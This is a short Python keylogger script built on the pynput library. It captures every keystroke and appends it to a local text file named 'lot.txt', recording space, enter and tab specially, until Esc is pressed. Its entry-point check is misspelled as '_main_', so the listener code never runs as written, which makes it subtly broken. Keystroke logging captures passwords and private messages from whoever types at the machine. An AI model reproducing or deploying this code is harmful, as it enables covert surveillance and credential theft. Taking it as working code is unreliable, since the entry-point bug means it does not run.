from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("lot.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logkey.write(' ')
            elif key == keyboard.Key.enter:
                logkey.write('\n')
            elif key == keyboard.Key.tab:
                logkey.write('\t')
            else:
                logkey.write('[' + str(key) + ']')

def keyreleased(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

if __name__== "_main_":
    listener = keyboard.Listener(on_press=keypressed, on_release=keyreleased)
    listener.start()
    listener.join()